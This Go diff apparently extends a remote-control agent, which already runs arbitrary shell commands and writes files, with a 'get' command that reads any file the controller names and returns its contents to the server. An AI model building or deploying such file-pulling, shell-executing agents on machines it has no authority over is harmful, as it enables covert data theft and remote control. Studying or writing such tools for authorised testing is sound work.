@@ -86,10 +86,28 @@ func executeCommand(command string, index int) (response string) {
 		response = listProcesses()
 	case "send":
 		response = saveFileToDisk(message.Commands[index].File)
+	case "get":
+		response = sendFileToServer(message.Commands[index].Command, index)
 	default:
 		response = executeCommandOnShell(command)
 	}
 
+	return response
+}
+
+func sendFileToServer(getCommand string, index int) (response string) {
+	var err error
+	response = "File sent to server"
+
+	separatedCommand := helpers.SeparateCommand(getCommand)
+
+	message.Commands[index].File.FileData, err = ioutil.ReadFile(separatedCommand[1])
+	if err != nil {
+		response = "Error reading file: " + err.Error()
+		message.Commands[index].File.Error = true
+	}
+
+	message.Commands[index].File.FileName = separatedCommand[1]
 	return response
 }
 
